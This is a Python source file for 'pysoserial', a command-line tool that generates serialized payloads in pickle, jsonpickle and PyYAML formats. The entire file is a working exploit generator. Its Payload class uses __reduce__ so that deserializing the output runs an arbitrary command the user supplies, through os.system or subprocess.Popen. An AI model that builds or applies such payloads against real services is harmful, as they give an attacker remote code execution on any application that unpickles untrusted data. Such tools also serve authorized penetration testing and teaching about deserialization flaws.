import os
import _pickle
import subprocess
import jsonpickle
import sys
import yaml
import argparse


class Payload:
    def __init__(self, commands, vector=None):
        self.vector = vector
        self.commands = commands

    def __reduce__(self):
        if self.vector == "os":
            return os.system, (self.commands,)
        elif self.vector == "subprocess":
            return subprocess.Popen, (self.commands,)


def print_available_formats():
    available_formats = {
        "pickle": "Format for cPickle and _pickle modules",
        "json": "Format for jsonpickle module",
        "yaml": "Format for PyYAML module"
        }
    for k, v in available_formats.items():
        print(f"    {k}: {v}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='pysoserial - A simple serialization payload generator', add_help=True)

    parser.add_argument(
        '-d', '--debug', required=False, action='store_true', default=False,
        help='Enable debug messages')
    parser.add_argument(
        '-s', '--save', required=False, action='store_true', default=False,
        help='Save payload to file')
    parser.add_argument(
        '-v', '--vector', required=False, choices=["os", "subprocess"], default="os",
        help='Save payload to file')
    parser.add_argument(
        '-f', '--format', required=True, choices=["pickle", "json", "yaml", "#"], default="#",
        help='Serialization archive format')
    parser.add_argument(
        '-c', '--command', type=str, required=False, default=None, help='Command for the payload')

    args = parser.parse_args()

    if args.format == "#":
        print(f"[*] The following format are accepted:")
        print_available_formats()
        sys.exit()
    if not args.command:
        print(f"[-] A command (-c) is required to generate the payload")
    command = args.command

    print(f"[+] Generating serialized object for:")
    print(f"    {command}")
    cls = Payload(command, args.vector)

    if args.format == "pickle":
        if args.save:
            with open("payload.bin", "wb") as payload:
                payload.write(_pickle.dumps(cls))
        else:
            print(f"[+] Final Payload:\n    {_pickle.dumps(cls)}")
    elif args.format == "json":
        if args.save:
            with open("payload.json", "w") as payload:
                payload.write(jsonpickle.encode(cls))
        else:
            print(f"[+] Final Payload:\n    {jsonpickle.encode(cls)}")
    elif args.format == "yaml":
        if args.save:
            with open("payload.yml", "w") as payload:
                yaml.dump(cls, payload)
        else:
            p = yaml.dump(cls).replace('\n', '\n    ')
            print(f"[+] Final Payload:\n    {p}")
    else:
        sys.exit()